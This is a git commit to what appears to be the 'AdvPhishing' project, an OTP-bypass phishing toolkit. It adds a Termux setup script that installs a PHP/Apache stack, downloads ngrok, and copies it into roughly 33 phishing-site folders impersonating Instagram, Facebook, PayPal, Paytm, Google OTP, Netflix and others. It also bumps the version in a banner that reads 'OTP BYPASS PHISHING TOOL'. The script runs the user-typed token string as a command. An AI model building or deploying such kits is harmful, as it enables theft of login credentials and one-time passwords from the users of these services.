415579ebdce45cdb6b7aaa2559e3e670188d1302
SG_PRO <55870659+Ignitetch@users.noreply.github.com>
2020-09-06 12:39:39 -0400

    Add files via upload

---
+++ Android-Setup.sh
@@ -0,0 +1,79 @@
+#!/bin/bash
+echo ""
+clear
+echo ""
+echo ""
+echo ""
+echo ""
+echo -e $'\e[1;91m[\e[0m\e[1;77m+\e[0m\e[1;91m]\e[0m\e[1;96m!!! DUDE PLEASE ENTER NGROK !!! \e[0m'
+sleep 2
+clear
+echo ""
+echo ""
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
+echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!         DOWNLOAD REQUIREMENTS         !!\e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
+echo ""
+termux-setup-storage
+sudo apt-get install apache2 -y
+apt install 
+apt install ruby -y
+apt install php -y
+apt install jq -y
+apt install tail -y
+apt install curl -y
+apt install zip -y
+pkg install wget -y
+pkg install ruby -y
+pkg install gem -y
+gem install lolcat
+clear
+wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip --no-check-certificate
+unzip ngrok-stable-linux-arm.zip
+cp -R ngrok secnhack sites/github/
+cp -R ngrok secnhack sites/Hotstar-otp-bypass/
+cp -R ngrok secnhack sites/instagram/
+cp -R ngrok secnhack sites/Linkedin/
+cp -R ngrok secnhack sites/Netflix/
+cp -R ngrok secnhack sites/Paytm-Phishing/paytm/
+cp -R ngrok secnhack sites/Paytm-Phishing/signup/
+cp -R ngrok secnhack sites/spotify/
+cp -R ngrok secnhack sites/whatsapp-phishing/
+cp -R ngrok secnhack sites/facebook/
+cp -R ngrok secnhack sites/google-otp/
+cp -R ngrok secnhack sites/instafollow/
+cp -R ngrok secnhack sites/ipfinder/
+cp -R ngrok secnhack sites/ola-otpbypass/
+cp -R ngrok secnhack sites/UberEats-Phishing/
+cp -R ngrok secnhack sites/Zomato-Phishing/
+cp -R ngrok secnhack sites/amazonsign/
+cp -R ngrok secnhack sites/tiktok/
+cp -R ngrok secnhack sites/phonepay/
+cp -R ngrok secnhack sites/paypal/
+cp -R ngrok secnhack sites/telegram/
+cp -R ngrok secnhack sites/twitter/
+cp -R ngrok secnhack sites/flipcart/
+cp -R ngrok secnhack sites/wordpress/
+cp -R ngrok secnhack sites/snapchat/
+cp -R ngrok secnhack sites/protonmail/
+cp -R ngrok secnhack sites/stackoverflow/
+cp -R ngrok secnhack sites/ebay/
+cp -R ngrok secnhack sites/twitch/
+cp -R ngrok secnhack sites/ajio/
+cp -R ngrok secnhack sites/cryptocurrency/
+cp -R ngrok secnhack sites/mobikwik/
+cp -R ngrok secnhack sites/pinterest/
+chmod 7777 AdvPhishing.sh
+clear
+echo ""
+echo -e $'\e[1;91m[\e[0m\e[1;33m *** \e[0m\e[1;96m]\e[0m\e[1;91m KEEP IN MIND YOU HAVE TO ENTER  \e[1;33m[ *** ]\e[0m'
+echo ""
+read -p $'\e[1;91m[\e[0m\e[1;77m+\e[0m\e[1;91m]\e[0m\e[1;96m Enter The Ngrok Token [Ex. ./ngrok authtoken 1Y7IU ] : \e[0m' token
+$token
+sleep2
+clear
+echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;96m\e[0m\e[1;92m  ---------------------------------   \e[1;91m\e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m !!    Installation Successfull   !!  \e[1;91m\e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;96m\e[0m\e[1;92m  ---------------------------------   \e[1;91m\e[0m'
+sleep 4
+clear
--- Logo.sh
+++ Logo.sh
@@ -14,12 +14,12 @@ banner() {
  echo -e $'\e[1;33m\e[0m\e[1;37m     ██   ██ ██   ██  ██  ██     \e[0m''\e[1;33m\e[0m\e[1;32m ██      ██   ██ ██      ██   \e[0m'
  echo -e $'\e[1;33m\e[0m\e[1;37m     ██   ██ ██████    ████      \e[0m''\e[1;33m\e[0m\e[1;32m ██      ██   ██ ██ ███████   \e[0m'
   echo""    
-  echo -e $'\e[1;33m\e[0m\e[1;33m    ██████████\e[0m'"\e[96m██████████"'\e[1;33m\e[0m\e[1;31m██████████\e[0m' '\e[1;32m\e[0m\e[1;32m OTP BYPASS PHISHING TOOL \e[0m''\e[1;37m\e[0m\e[1;37m [v 2.0] \e[0m'                                       
+  echo -e $'\e[1;33m\e[0m\e[1;33m    ██████████\e[0m'"\e[96m██████████"'\e[1;33m\e[0m\e[1;31m██████████\e[0m' '\e[1;32m\e[0m\e[1;32m OTP BYPASS PHISHING TOOL \e[0m''\e[1;37m\e[0m\e[1;37m [v 2.1] \e[0m'                                       
   echo ""
    echo -e $'\e[1;33m\e[0m\e[1;33m  [ \e[0m\e[1;32m Follow on Github :- https://github.com/Ignitetch/AdvPhishing \e[0m \e[1;32m\e[0m\e[1;33m] \e[0m'
    echo ""
       echo -e $'\e[1;37m\e[0m\e[1;37m    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ >>\e[0m'
-      echo -e "\e[93m    |A|D|V|A|N|C|E| |P|H|I|S|H|I|N|G| |2|.|0|"      
+      echo -e "\e[93m    |A|D|V|A|N|C|E| |P|H|I|S|H|I|N|G| |2|.|1|"      
       echo -e $'\e[1;37m\e[0m\e[1;37m    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ >>\e[0m' 
       echo ""                                                
       }
